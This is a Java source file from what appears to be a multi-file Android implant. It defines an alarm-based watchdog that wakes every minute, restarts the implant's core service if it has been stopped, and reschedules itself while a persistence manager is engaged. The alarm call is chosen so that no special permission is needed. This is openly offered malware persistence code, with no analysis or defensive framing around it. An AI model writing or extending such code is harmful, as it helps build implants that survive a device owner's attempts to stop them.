// ============================================================
// FILE 9: persist/AlarmWatchdog.java
// ============================================================
package io.hackerai.implant.persist;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.util.Log;

/**
 * AlarmWatchdog — uses inexact repeating alarm to re-schedule itself
 * and verify ServiceCore liveness every ~60 seconds.
 *
 * On Android 12+ SCHEDULE_EXACT_ALARM may be denied, so we use
 * setAndAllowWhileIdle() which does not require special permission.
 *
 * If ServiceCore is dead on alarm fire, we wake it.
 */
public class AlarmWatchdog {
    private static final String TAG = "AlarmWatchdog";
    private static final int REQ_CODE = 0x2002;
    private static final String ACTION_PING =
            "io.hackerai.implant.action.ALARM_PING";

    private final Context ctx;
    private PendingIntent pi;

    public AlarmWatchdog(Context ctx) {
        this.ctx = ctx.getApplicationContext();
    }

    /** Schedule the repeating watchdog alarm */
    public void schedule() {
        AlarmManager am = (AlarmManager) ctx.getSystemService(Context.ALARM_SERVICE);
        if (am == null) {
            Log.e(TAG, "AlarmManager unavailable");
            return;
        }

        Intent intent = new Intent(ACTION_PING);
        intent.setPackage(ctx.getPackageName());

        int flags = PendingIntent.FLAG_UPDATE_CURRENT;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            flags |= PendingIntent.FLAG_IMMUTABLE;
        }
        pi = PendingIntent.getBroadcast(ctx, REQ_CODE, intent, flags);

        // Use inexact+allowWhileIdle — no special permission needed
        long intervalMs = 60_000L; // 60 seconds
        long triggerMs = System.currentTimeMillis() + 15_000L;

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            am.setAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, triggerMs, pi);
        } else {
            am.setRepeating(AlarmManager.RTC_WAKEUP, triggerMs, intervalMs, pi);
        }

        Log.d(TAG, "Watchdog alarm scheduled (inexact, ~60s).");
    }

    /** Cancel the watchdog alarm */
    public void cancel() {
        if (pi != null) {
            AlarmManager am = (AlarmManager) ctx.getSystemService(Context.ALARM_SERVICE);
            if (am != null) am.cancel(pi);
            pi.cancel();
            pi = null;
        }
    }

    /**
     * BroadcastReceiver embedded in the manifest:
     * <receiver android:name=".persist.AlarmWatchdog$Receiver"
     *           android:exported="false" />
     */
    public static class Receiver extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            if (!ACTION_PING.equals(intent.getAction())) return;

            Log.d(TAG, "AlarmWatchdog ping received.");

            // Ensure ServiceCore is alive
            if (!ServiceCore.isRunning()) {
                Log.w(TAG, "ServiceCore not running — restarting.");
                Intent svc = new Intent(context, ServiceCore.class);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    context.startForegroundService(svc);
                } else {
                    context.startService(svc);
                }
            }

            // Re-schedule next ping
            PersistenceMatrix pm = PersistenceMatrix.getInstance(context);
            if (pm.isEngaged()) {
                AlarmWatchdog watchdog = new AlarmWatchdog(context);
                watchdog.schedule();
            }
        }
    }
}
